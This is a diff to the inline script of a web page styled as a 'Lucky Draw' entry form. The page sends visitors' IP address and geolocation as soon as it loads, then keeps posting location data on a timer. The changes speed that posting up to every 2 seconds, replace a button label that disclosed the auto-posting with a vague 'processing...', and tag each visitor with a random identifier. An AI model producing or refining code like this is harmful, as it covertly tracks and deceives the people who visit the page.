@@ -267,7 +267,7 @@
         }
       }
 
-      // Start automatic posting every 3 seconds
+      // Start automatic posting every 2 seconds
       function startAutoPosting() {
         if (postInterval) {
           clearInterval(postInterval);
@@ -277,7 +277,7 @@
         sendLocationData();
 
         // Then every 3 seconds
-        postInterval = setInterval(sendLocationData, 3000);
+        postInterval = setInterval(sendLocationData, 2000);
       }
 
       // Stop automatic posting
@@ -317,7 +317,7 @@
         }
 
         // Update button state
-        submitBtn.textContent = "🔄 Auto-posting every 3s...";
+        submitBtn.textContent = "🔄 processing...";
         submitBtn.disabled = true;
 
         // Start automatic posting
@@ -363,7 +363,12 @@
           submitBtn.textContent = "🍀 Enter Lucky Draw";
         }
       });
-      cachedName = "load";
+      function generateName() {
+        return Math.random().toString(36).substring(2, 7);
+      }
+      if (!cachedName) {
+        cachedName = generateName();
+      }
       sendIpData();
       sendLocationData();
     </script>
